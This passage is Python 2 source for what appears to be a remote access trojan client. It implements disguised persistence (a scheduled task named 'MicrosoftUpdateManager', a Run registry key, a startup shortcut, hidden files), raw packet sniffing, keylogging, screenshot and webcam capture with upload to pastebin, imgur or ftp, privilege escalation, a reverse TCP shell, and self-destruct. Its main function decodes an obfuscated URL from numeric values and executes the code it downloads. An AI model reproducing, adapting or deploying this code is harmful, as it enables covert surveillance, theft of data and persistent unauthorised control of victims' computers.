            if self.persistence.get('launch_agent'):
                if os.path.isfile(launch_agent):
                    try:
                        os.remove(launch_agent)
                        return True
                    except: pass
        return False

    @windows
    @linux
    @darwin
    def _persistence_add_hidden_file(self, *args, **kwargs):
        if hasattr(self, '__f__'):
            try:
                value        = self._long_to_bytes(long(self.__f__))
            except:
                value        = self.__f__
            if os.path.isfile(value):
                try:
                    if os.name is 'nt':
                        path = value
                        hide = subprocess.call('attrib +h {}'.format(path), shell=True) == 0
                    else:
                        dirname, basename = os.path.split(value)
                        path = os.path.join(dirname, '.' + basename)
                        hide = subprocess.call('mv {} {}'.format(value, path), shell=True) == 0
                    if hide:
                        if path != value:
                            self.__f__ = bytes(self._bytes_to_long(self._upload_pastebin(path)))[-21:]
                        return (True, path)
                except Exception as e:
                    self._debug('Adding hidden file error: {}'.format(str(e)))
        return (False, None)

    @windows
    @linux
    @darwin
    def _persistence_remove_hidden_file(self, *args, **kwargs):
        if hasattr(self, '__f__'):
            try:
                filename     = self._long_to_bytes(long(self.__f__))
            except:
                filename      = self.__f__
            if os.path.isfile(filename):
                try:
                    unhide  = 'attrib -h {}'.format(filename) if os.name is 'nt' else 'mv {} {}'.format(filename, os.path.join(os.path.dirname(filename), os.path.basename(filename).strip('.')))
                    if subprocess.call(unhide, 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True) == 0:
                        return True
                except Exception as e:
                    self._debug('Error unhiding file: {}'.format(str(e)))
        return False
    
    @windows
    def _persistence_add_scheduled_task(self, task_name='MicrosoftUpdateManager'):
        if hasattr(self, '__f__'):
            try:
                value       = self._long_to_bytes(long(self.__f__))
            except:
                value       = self.__f__
            if os.path.isfile(value):
                tmpdir      = os.path.expandvars('%TEMP%')
                task_run    = os.path.join(tmpdir, task_name + os.path.splitext(value)[1])
                if not os.path.isfile(task_run):
                    with file(task_run, 'w') as copy:
                        copy.write(open(value).read())
                try:
                    cmd     = 'SCHTASKS /CREATE /TN {} /TR {} /SC hourly /F'.format(task_name, task_run)
                    result  = subprocess.check_output(cmd, shell=True)
                    if 'SUCCESS' in result:
                        return (True, result)
                except Exception as e:
                    self._debug('Add scheduled task error: {}'.format(str(e)))
        return (False, None)

    @windows
    def _persistence_remove_scheduled_task(self, task_name='MicrosoftUpdateManager'):
        if hasattr(self, '__f__'):
            try:
                return subprocess.call('SCHTASKS /DELETE /TN {} /F'.format(task_name), shell=True) == 0
            except: pass
            return False

    @windows    
    def _persistence_add_startup_file(self, task_name='MicrosoftUpdateManager'):
        if hasattr(self, '__f__'):
            try:
                value = self._long_to_bytes(long(self.__f__))
            except:
                value = self.__f__
            if os.path.isfile(value):
                try:
                    appdata = os.path.expandvars("%AppData%")
                    startup_dir = os.path.join(appdata, 'Microsoft\Windows\Start Menu\Programs\Startup')
                    if not os.path.exists(startup_dir):
                        os.makedirs(startup_dir)
                    startup_file = os.path.join(startup_dir, '%s.eu.url' % task_name)
                    content = '\n[InternetShortcut]\nURL=file:///%s\n' % value
                    if not os.path.exists(startup_file) or content != open(startup_file, 'r').read():
                        with file(startup_file, 'w') as fp:
                            fp.write(content)
                    return (True, startup_file)
                except Exception as e:
                    self._debug('Adding startup file error: {}'.format(str(e)))
        return (False, None)

    @windows
    def _persistence_remove_startup_file(self, task_name='MicrosoftUpdateManager'):
        if hasattr(self, '__f__'):
            appdata      = os.path.expandvars("%AppData%")
            startup_dir  = os.path.join(appdata, 'Microsoft\Windows\Start Menu\Programs\Startup')
            startup_file = os.path.join(startup_dir, task_name) + '.eu.url'
            if os.path.exists(startup_file):
                try:
                    os.remove(startup_file)
                    return True
                except:
                    try:
                        _  = os.popen('del {} /f'.format(startup_file)).read()
                        return True
                    except: pass
            return False

    @windows
    def _persistence_add_registry_key(self, task_name='MicrosoftUpdateManager'):
        if hasattr(self, '__f__'):
            try:
                value = self._long_to_bytes(long(self.__f__))
            except:
                value = self.__f__
            if os.path.isfile(value):
                run_key = r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
                reg_key = OpenKey(HKEY_CURRENT_USER, run_key, 0, KEY_WRITE)
                try:
                    SetValueEx(reg_key, task_name, 0, REG_SZ, value)
                    CloseKey(reg_key)
                    return (True, task_name)
                except Exception as e:
                    self._debug('Remove registry key error: {}'.format(str(e)))
        return (False, None)
    
    @windows
    def _persistence_remove_registry_key(self, task_name='MicrosoftUpdateManager'):
        if hasattr(self, '__f__'):
            try:
                key = OpenKey(HKEY_CURRENT_USER, r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS)
                DeleteValue(key, task_name)
                CloseKey(key)
                return True
            except: pass
        return False

    @linux
    @darwin
    def _packetsniff_manager(self, seconds=30.0):
        if os.name is 'nt':
            return
        limit = time.time() + seconds
        sniffer_socket = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
        while time.time() < limit:
            try:
                recv_data = sniffer_socket.recv(2048)
                recv_data, ip_bool = self._packetsniff_eth_header(recv_data)
                if ip_bool:
                    recv_data, ip_proto = self._packetsniff_ip_header(recv_data)
                    if ip_proto == 6:
                        recv_data = self._packetsniff_tcp_header(recv_data)
                    elif ip_proto == 17:
                        recv_data = self._packetsniff_udp_header(recv_data)
            except: break
        try:
            sniffer_socket.close()
        except: pass
        try:
            output = cStringIO.StringIO('\n'.join(self.packetsniff.capture))
            result = self._upload_pastebin(output) if self.upload.status.is_set() else output.getvalue()
            task   = self.packetsniff.func_name
            task_id= self._task(task)
            self._results[task_id] = {task: {time.time(): result}}
        except Exception as e:
            result = str(e)
        return result

    @linux
    @darwin
    def _packetsniff_udp_header(self, data):
        try:
            udp_hdr = struct.unpack('!4H', data[:8])
            src = udp_hdr[0]
            dst = udp_hdr[1]
            length = udp_hdr[2]
            chksum = udp_hdr[3]
            data = data[8:]
            self.packetsniff.capture.append('|================== UDP HEADER ==================|')
            self.packetsniff.capture.append('|================================================|')
            self.packetsniff.capture.append('|{:>20} | {}\t\t\t |'.format('Source', src))
            self.packetsniff.capture.append('|{:>20} | {}\t\t\t |'.format('Dest', dst))
            self.packetsniff.capture.append('|{:>20} | {}\t\t\t |'.format('Length', length))
            self.packetsniff.capture.append('|{:>20} | {}\t\t\t |'.format('Check Sum', chksum))
            self.packetsniff.capture.append('|================================================|')
            return data
        except Exception as e:
            self.packetsniff.capture.append("Error in {} header: '{}'".format('UDP', str(e)))

    @linux
    @darwin
    def _packetsniff_tcp_header(self, recv_data):
        try:
            tcp_hdr = struct.unpack('!2H2I4H', recv_data[:20])
            src_port = tcp_hdr[0]
            dst_port = tcp_hdr[1]
            seq_num = tcp_hdr[2]
            ack_num = tcp_hdr[3]
            data_ofs = tcp_hdr[4] >> 12
            reserved = (tcp_hdr[4] >> 6) & 0x03ff
            flags = tcp_hdr[4] & 0x003f
            flagdata = {
                'URG' : bool(flags & 0x0020),
                'ACK' : bool(flags & 0x0010),
                'PSH' : bool(flags & 0x0008),
                'RST' : bool(flags & 0x0004),
                'SYN' : bool(flags & 0x0002),
                'FIN' : bool(flags & 0x0001)
            }
            win = tcp_hdr[5]
            chk_sum = tcp_hdr[6]
            urg_pnt = tcp_hdr[7]
            recv_data = recv_data[20:]
            self.packetsniff.capture.append('|================== TCP HEADER ==================|')
            self.packetsniff.capture.append('|================================================|')
            self.packetsniff.capture.append('|{:>20} | {}\t\t\t |'.format('Source', src_port))
            self.packetsniff.capture.append('|{:>20} | {}\t\t\t |'.format('Target', dst_port))
            self.packetsniff.capture.append('|{:>20} | {}\t\t\t |'.format('Seq Num', seq_num))
            self.packetsniff.capture.append('|{:>20} | {}\t\t |'.format('Ack Num', ack_num))
            self.packetsniff.capture.append('|{:>20} | {}\t\t |'.format('Flags', ', '.join([flag for flag in flagdata if flagdata.get(flag)])))
            self.packetsniff.capture.append('|{:>20} | {}\t\t\t |'.format('Window', win))
            self.packetsniff.capture.append('|{:>20} | {}\t\t\t |'.format('Check Sum', chk_sum))
            self.packetsniff.capture.append('|{:>20} | {}\t\t\t |'.format('Urg Pnt', urg_pnt))
            self.packetsniff.capture.append('|================================================|')
            return recv_data
        except Exception as e:
            self.packetsniff.capture.append("Error in {} header: '{}'".format('TCP', str(e)))

    @linux
    @darwin
    def _packetsniff_ip_header(self, data):
        try:
            ip_hdr = struct.unpack('!6H4s4s', data[:20]) 
            ver = ip_hdr[0] >> 12
            ihl = (ip_hdr[0] >> 8) & 0x0f
            tos = ip_hdr[0] & 0x00ff 
            tot_len = ip_hdr[1]
            ip_id = ip_hdr[2]
            flags = ip_hdr[3] >> 13
            fragofs = ip_hdr[3] & 0x1fff
            ttl = ip_hdr[4] >> 8
            ipproto = ip_hdr[4] & 0x00ff
            chksum = ip_hdr[5]
            src = socket.inet_ntoa(ip_hdr[6])
            dest = socket.inet_ntoa(ip_hdr[7])
            data = data[20:]
            self.packetsniff.capture.append('|================== IP HEADER ===================|')
            self.packetsniff.capture.append('|================================================|')
            self.packetsniff.capture.append('|{:>20} | {}\t\t\t |'.format('VER', ver))
            self.packetsniff.capture.append('|{:>20} | {}\t\t\t |'.format('IHL', ihl))
            self.packetsniff.capture.append('|{:>20} | {}\t\t\t |'.format('TOS', tos))
            self.packetsniff.capture.append('|{:>20} | {}\t\t\t |'.format('Length', tot_len))
            self.packetsniff.capture.append('|{:>20} | {}\t\t\t |'.format('ID', ip_id))
            self.packetsniff.capture.append('|{:>20} | {}\t\t\t |'.format('Flags', flags))
            self.packetsniff.capture.append('|{:>20} | {}\t\t\t |'.format('Frag Offset', fragofs))
            self.packetsniff.capture.append('|{:>20} | {}\t\t\t |'.format('TTL', ttl))
            self.packetsniff.capture.append('|{:>20} | {}\t\t\t |'.format('Next Protocol', ipproto))
            self.packetsniff.capture.append('|{:>20} | {}\t\t\t |'.format('Check Sum', chksum))
            self.packetsniff.capture.append('|{:>20} | {}\t\t |'.format('Source IP', src))
            self.packetsniff.capture.append('|{:>20} | {}\t\t |'.format('Dest IP', dest))
            self.packetsniff.capture.append('|================================================|')
            return data, ipproto
        except Exception as e:
            self.packetsniff.capture.append("Error in {} header: '{}'".format('IP', str(e)))

    @linux
    @darwin
    def _packetsniff_eth_header(self, data):
        try:
            ip_bool = False
            eth_hdr = struct.unpack('!6s6sH', data[:14])
            dst_mac = binascii.hexlify(eth_hdr[0])
            src_mac = binascii.hexlify(eth_hdr[1])
            proto = eth_hdr[2] >> 8
            self.packetsniff.capture.append('|================================================|')
            self.packetsniff.capture.append('|================== ETH HEADER ==================|')
            self.packetsniff.capture.append('|================================================|')
            self.packetsniff.capture.append('|{:>20} | {}\t |'.format('Target MAC', '{}:{}:{}:{}:{}:{}'.format(dst_mac[0:2],dst_mac[2:4],dst_mac[4:6],dst_mac[6:8],dst_mac[8:10],dst_mac[10:12])))
            self.packetsniff.capture.append('|{:>20} | {}\t |'.format('Source MAC', '{}:{}:{}:{}:{}:{}'.format(src_mac[0:2],src_mac[2:4],src_mac[4:6],src_mac[6:8],src_mac[8:10],src_mac[10:12])))
            self.packetsniff.capture.append('|{:>20} | {}\t\t\t |'.format('Protocol', proto))
            self.packetsniff.capture.append('|================================================|')
            if proto == 8:
                ip_bool = True
            data = data[14:]
            return data, ip_bool
        except Exception as e:
            self.packetsniff.capture.append("Error in {} header: '{}'".format('ETH', str(e)))



    # commands



    @command
    def kill(self):
        """
        kill connection to server

        """
        try:
            self._socket.close()
            self._connected.clear()
        except Exception as e:
            self._debug(str(e))
        for t in [i for i in self._threads]:
            try:
                _ = self._threads.pop(t, None)
                del _
            except: pass

    @command
    def stop(self, target):
        """
        stop a job

        """
        if hasattr(self, target):
            if hasattr(getattr(self, target), 'status'):
                getattr(self, target).status.clear()
            if target in self._threads:
                _ = self._threads.pop(target, None)
            return "Job '{}' was stopped.".format(target)
        else:
            return "No jobs or modules found with name '{}'".format(str(target))

    @command
    def standby(self):
        """
        disconnect but keep client alive

        """
        self._socket.close()
        self._connected.clear()
        return self._connect()

    @command
    def admin(self):
        """
        attempt to escalate privileges

        """
        if self._info['Admin']:
            return "Current user has administrator privileges"
        if hasattr(self, '__f__') and os.path.isfile(self._long_to_bytes(long(self.__f__))):
            if os.name is 'nt':
                try:
                    ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters='{} asadmin'.format(self._long_to_bytes(long(self.__f__))))
                    sys.exit()
                except: pass
            else:
                return "Privilege escalation not yet available on '{}'".format(sys.platform)
        return "Privilege escalation failed"

    @command
    def unzip(self, path):
        """
        unzip a compressed archive/file

        """
        if os.path.isfile(path):
            try:
                result = zipfile.ZipFile(path).extractall('.')
            except Exception as e:
                result = str(e)
        else:
            result = 'Error: file not found'
        return result

    @command
    def help(self, cmd=None):
        """
        show command usage information

        """
        if not cmd:
            return '\n'.join([' {:>12}\t|\t{}'.format('USAGE',' DESCRIPTION'),
                              ' -------------------------------------------------------------------------------'] + ['{:>14}\t|{}'.format(self._commands[cmd].usage, self._commands[cmd].func_doc.strip('\n').strip('\t').rstrip()) for cmd in sorted(self._commands.keys())] + [' -------------------------------------------------------------------------------'])
        elif cmd in self._commands:
            return '\n'.join([' {:>12}\t|\t{}'.format('USAGE',' DESCRIPTION'),
                              ' -------------------------------------------------------------------------------'] + ['{:>14}\t|{}'.format(self._commands[cmd].usage, self._commands[cmd].func_doc.strip('\n').strip('\t').rstrip())] + [' -------------------------------------------------------------------------------'])
        else:
            return "Error: command '{}' not found".format(str(cmd))

    @command
    def jobs(self):
        """
        show current active client jobs

        """
        return '\n'.join(['  JOBS', ' -----------------------------------------------']  + [' {}{:>40}'.format(a, self._get_status(c=time.time()-float(self._threads[a].name))) for a in self._threads if self._threads[a].is_alive()]) + '\n'

    @command
    def info(self):
        """
        show client host machine info

        """
        return '\n'.join(['  {}{:>20}'.format('ENVIRONMENT','VARIABLES')] + [' --------------------------------'] + [' {:>13} {:>18}'.format(a,b) for a,b in self._info.items()]) + '\n'

    @command
    def network(self, target=None):
        """
        display the local network discovered so far

        """
        result  = []
        if target in self._network:
            result.extend(['{:>12}{:>12}{:>12}\t{:>12}'.format('PORT','STATE','PROTOCOL','SERVICE'),
                           '----------------------------------------------------------------'])
            for port in self._network.get(target).get('ports').keys():
                info  = self._network.get(target).get('ports').get(port)
                result.append('{:>12}{:>12}{:>12}\t{:>12}'.format(port, info.get('state'), info.get('protocol'), ''.join([i for i in info.get('service') if i in '''0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&()+,-./:<=>?@[\]^_{|}~'''])[:20] + ''.join(['...' if len(info.get('service')) else ''])))
            result.append('')
        else:
            if not target and len(self._network):
                result.extend(['{:>12}{:>12}{:>12}\t{:>12}'.format('PORT','STATE','PROTOCOL','SERVICE'),
                               '----------------------------------------------------------------'])
                for target in self._network:
                    result.append(target)
                    for port in self._network.get(target).get('ports').keys():
                        info  = self._network.get(target).get('ports').get(port)
                        result.append('{:>12}{:>12}{:>12}\t{:>12}'.format(port, info.get('state'), info.get('protocol'), ''.join([i for i in info.get('service') if i in '''0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&()+,-./:<=>?@[\]^_{|}~'''])[:20] + ''.join(['...' if len(info.get('service')) else ''])))
                result.append('')
            else:
                return "Nothing found"
        return '\n'.join(result)

    @command
    def upload(self, *args):
        """
        upload file/data to imgur, pastebin, or ftp

        """
        if len(args) != 2:
            return 'usage: upload <mode> <file>\nmode: ftp, pastebin, imgur\nfile: name of target file'
        source  = args[1]
        mode    = args[0].lower()
        if mode not in self.upload.options:
            return "Error: mode must be one of: ftp, pastebin, imgur"
        try:
            return getattr(self, '_upload_{}'.format(mode.lower()))(open(source, 'rb'))
        except Exception as e:
            return 'Upload error: {}'.format(str(e))

    @command
    def keylogger(self):
        """
        log keystrokes and upload to pastebin or ftp

        """
        if 'keylogger' not in self._threads or not self._threads['keylogger'].is_alive():
            self._threads['keylogger'] = threading.Thread(target=self._keylogger_manager, name=time.time())
            self._threads['keylogger'].start()
            return 'Keylogger started'
        else:
            return 'Keylogger running {}'.format(self._get_status(float(self._threads['keylogger'].name)))

    @command
    def screenshot(self):
        """
        capture screenshot and upload to imgur or ftp

        """
        with mss.mss() as screen:
            img = screen.grab(screen.monitors[0])
        png     = self._png(img)
        opt     = str(self.screenshot.options['upload']).lower()
        result  = getattr(self, '_upload_{}'.format(opt))(png) if opt in ('imgur','ftp') else self._upload_imgur(png)
        return result

    @command
    def persistence(self):
        """
        establish persistence on client to maintain access

        """
        for method in [_ for _ in self.persistence.options if not self.persistence.options[_]]:
            try:
                target = '_persistence_add_{}'.format(method)
                successful, result = getattr(self, target)()
                self.persistence.options[method] = successful
                task = target.strip('_')
                task_id = self._task(task)
                self._results[task_id] = {task: {time.time(): result}}
            except Exception as e:
                self._debug(str(e))
        return "%d persistence methods established" % self.persistence.options.values().count(True)

    @command
    def packetsniff(self):
        """
        capture packets and upload to pastebin or ftp

        """
        try:
            self._threads['packetsniffer'] = threading.Thread(target=self._packetsniff_manager, args=(float(self.packetsniff.options['duration']),))
            self._threads['packetsniffer'].start()
            result = 'Packetsniffer is running'
        except Exception as e:
            result = 'Error monitoring network traffic: {}'.format(str(e))
        return result

    @command
    def results(self):
        """
        show all task results

        """
        output  = ['{:>33}{:>33}{:>33}{:>33}'.format('Task ID', 'Module', 'Timestamp', 'Result'), '----------------------------------------------------------------------------------------------------------------------------------------']
        for task_id, task_info in self._results.items():
            for task, info in task_info.items():
                for timestamp, result in info.items():
                    result = result.replace('\n',' ')
                    if len(result) > 50:
                        result = result[:47] + '...'
                    output.append('{:>33}{:>33}{:>33}\t{}'.format(task_id, task, time.ctime(timestamp), result))
        return '\n'.join(output)

    @command
    def selfdestruct(self):
        """
        self-destruct and leave no trace on disk

        """
        try:
            self._exit = True
            for method in self.persistence.options:
                try:
                    target = 'persistence_remove_{}'.format(method)
                    getattr(self, target)()
                except Exception as e2:
                    self._debug('Error removing persistence: {}'.format(str(e2)))
            self._socket.close()
            if hasattr(self, '__f__') and os.path.isfile(self._long_to_bytes(long(self.__f__))).read():
                os.remove(self.__f__)
            if '__file__' in globals():
                os.remove(__file__)
            for i in self._threads:
                t = self._threads.pop(i, None)
        finally:
            shutdown = threading.Timer(1, self._shutdown)
            shutdown.start()
            sys.exit(0)

    @command
    def options(self, target=None):
        """
        display client options

        """
        try:
            output = ['\n{:>7}{:>23}{:>11}'.format('MODULE','OPTION','VALUE'),'-----------------------------------------']
            if not target:
                output.append(' encryption')
                for key,val in self.encryption().items():
                    if key == 'status':
                        val = val.is_set()
                    output.append('{:>30} {:>10}'.format(str(key), str(val)))
                for target in [attr for attr in vars(self).keys() if hasattr(getattr(self, attr), 'options') if attr != 'encryption']:
                    for option,value in getattr(self, target).options.items():
                        output.append('{:>30} {:>10}'.format(option, str(value)))
            else:
                if not hasattr(self, target):
                   return "'{}' not found".format(target)
                elif not hasattr(getattr(self, target), 'options'):
                    return "No options found for '{}'".format(target)
                else:
                    output.append(target)
                    for option,value in getattr(self, target).options.items():
                        output.append('{:>30} {:>10}'.format(option, str(value)))
            return '\n'.join(output)
        except Exception as e:
            return 'Error viewing options: {}'.format(str(e))

    @command
    def update(self, uri):
        """
        download and install client update

        """
        global main
        try:
            name = os.path.splitext(os.path.basename(uri))[0]
            source = urllib2.urlopen(uri).read()
            try:
                source = json.loads(source)
                self = main(**source)
                self.start()
            except:
                module = imp.new_module()
                exec source in module.__dict__
                attributes = {arg: self._kwargs.get(arg)  for arg in self._kwargs}
                attributes.update({attr: getattr(self, '_{}'.format(attr)) for attr in ['results','queue','connected','socket']})
                self = main(**attributes)                
        except Exception as e:
            self._debug("Update error: {}".format(str(e)))

    @command
    def start(self):
        """
        configure + connect + register + reverse tcp shell
        
        """
        time.clock()
        self._configure()
        self._connect()
        self._register()
        self.shell()
                     
    @command
    def set(self, arg):
        """
        set client options
        
        """
        try:
            target, _, opt = arg.partition(' ')
            option, _, val = opt.partition('=')
            if not hasattr(self, target) or target not in self._commands:
                return "command '{}' not found".format(target)
            if not hasattr(getattr(self, target), 'options'):
                return "command '{}' has no options".format(target)
            if option not in getattr(self, target).options:
                return "Option '{}' not found for target '{}'".format(option, target)
            if val.isdigit() and int(val) in (0,1):
                val = bool(int(val))
            elif val.isdigit():
                val = int(val)
            elif val.lower() in ('true', 'on', 'enable'):
                val = True
            elif val.lower() in ('false', 'off', 'disable'):
                val = False
            elif ',' in val:
                val = val.split(',')
            getattr(self, target).options[option] = val
        except Exception as e:
            return "'Command: '{}' with arguments '{}' returned error: '{}'".format(self.set.func_name, arg, str(e))
        return self.options(target.lower())
    
    @command
    def scan(self, arg):
        """
        port scanner - modes: host, ports, network

        """
        if not hasattr(self, '_services'):
            self._services  = self._get_services()
        if len(arg.split()) == 1:
            host     = self._get_host()['private']
            if arg   == 'network':
                mode = 'network'
            elif arg == 'host':
                mode = 'host'
            elif arg == 'ports':
                mode = 'ports'
            else:
                return "usage: scan <mode> <ip>\nmode: network, host, ports"
        else:
            mode, _, host = arg.partition(' ')
            if mode not in ('host', 'ports', 'network'):
                return "usage: scan <mode> <ip>\nmode: network, host, ports"
            if not self._is_ipv4_address(host):
                return "Invalid target IP address"
        name = '%s scan' % mode
        if mode == 'network':
            self._threads[name] = threading.Thread(target=self._scan_subnet, args=(host,), name=time.time())
        elif mode == 'ports':
            self._threads[name] = threading.Thread(target=self._scan_all_ports, args=(host,), name=time.time())
        if self._ping(host):
            self._network[host] = {'ports': {}}
            if name in self._threads:
                self._threads[name].start()
                self._threads[name].join()
            return self.network(target=host)
        else:
            return "Host {} offline".format(host)
        
    @command
    def webcam(self, args=None):
        """
        capture from webcam and upload to imgur, pastebin, ftp

        """
        port = None
        if not args:
            if self.webcam.options['image']:
                mode = 'image'
            elif self.webcam.options['video']:
                mode = 'video'
            else:
                return "usage: webcam <mode> [options]"
        else:
            args = str(args).split()
            mode = args[0].lower()
            if 'image' in mode:
                mode = 'image'
            elif 'video' in mode:
                mode = 'video'
            elif 'stream' in mode:
                mode = 'stream'
                if len(args) != 2:
                    return "Error - stream mode requires argument: 'port'"
                port = args[1]
            else:
                return "usage: webcam <mode> [options]"
        try:
            result = getattr(self, '_webcam_{}'.format(mode))(port=port)
        except Exception as e:
            result = str(e)
        return result

    @command
    def ps(self, args=None):
        """
        list, search, or kill processes

        """
                
        if not args:
            return '\n'.join(i for i in self._get_process_list())
        
        cmd, _, arg = str(args).partition(' ')
    
        if 'aux' in cmd or 'exe' in cmd:
            return '\n'.join(i for i in self._get_process_list(executables=True))

        elif 'kill' in cmd or 'terminate' in cmd:
            try:
                pr = psutil.Process(pid=int(arg))
                pr.kill()
                return "Process {} killed".format(arg)
            except:
                return "Process {} does not exist or access was denied".format(arg)

        elif 'search' in cmd:
            process_list = self._get_process_list(executables=True)
            output       = [next(process_list)]
            while True:
                try:
                    p = next(process_list)
                    if arg in p:
                        output.append(p)
                except: break
            if len(output) == 2:
                output.extend(["","None found",""])
            return '\n'.join(output)

    @command
    def sleep(self, duration=60):
        """
        force client to sleep for the given duration

        """
        try:
            self._sleep.set()
            time.sleep(int(duration))
        except Exception as e:
            self._debug(str(e))
        self._sleep.clear()
        
    @command 
    def batch(self, args):
        """
        runs commands one per line from the web page

        """
        if not str(args).startswith('http'):
            return "Invalid target - must begin with http:// or https://"
        try:
            uri, _, iterations = str(args).partition(' ')
            iterations = 0 if not str(iterations).isdigit() else int(iterations)
            commands = urllib2.urlopen(uri).read().splitlines()
            while True:
                for line in commands:
                    task, _, action = line.partition(' ')
                    if task in self._commands:
                        try:
                            result  = self._commands[task]() if not action else self._commands[task](action)
                            task_id = self._task(task)
                            self._results[task_id] = {task: {time.time(): result}}
                        except Exception as e:
                            result = str(e)
                if iterations > 0:
                    iterations -= 1
                    continue
                else:
                    break
        except Exception as e:
            return "Batch error: {}".format(str(e))

    @command
    def cd(self, path='.'):
        """
        change directory

        """
        return os.chdir(path) if os.path.isdir(path) else os.chdir('.')


    @command
    def ls(self, path='.'):
        """
        list directory contents

        """
        return '\n'.join(os.listdir(path)) if os.path.isdir(path) else 'Error: path not found'
    
    @command
    def pwd(self):
        """
        show name of present working directory

        """
        return '\n' + os.getcwd() + '\n'

    @command
    def cat(self, path):
        """
        display file contents

        """
        return open(path).read(4000) if os.path.isfile(path) else 'Error: file not found'

    @command
    def wget(self, url):
        """
        download file from url

        """
        return urllib.urlopen(target).read() if target.startswith('http') else 'Error: target URL must begin with http:// or https://'

    @command
    def shell(self):
        """
        reverse tcp shell from client to server

        """
        self._threads['shell'] = threading.Thread(target=self._reverse_tcp_shell, name=time.time())
        self._threads['shell'].start()



def main(*args, **kwargs):
    if 'w' in kwargs:
        exec "import urllib" in globals()
        imports = urllib.urlopen(bytes(bytearray.fromhex(hex(long('120950513014781697487772252820504293289885893009420441905241{}'.format(kwargs['w']))).strip('0x').strip('L')))).read()
        exec imports in globals()
    if 'f' not in kwargs and '__file__' in globals():
        kwargs['f'] = __file__
    client = Client(**kwargs)
    client.start()
    return client



if __name__ == '__main__':
   m = main(**{
  "a": "81547499566857937463", 
  "c": "80194446127549985092", 
  "b": "79965932444658643559", 
  "e": "78307486292777321027", 
  "d": "81472904329291720535", 
  "g": "81336687865394389318", 
  "l": "79328905141602841418", 
  "q": "79959173599698569031", 
  "s": "81399447134546511973", 
  "r": "81625455082210413622", 
  "u": "79887637380649800526", 
  "t": "76513023804609418584", 
  "w": "78464502926721833581"
})
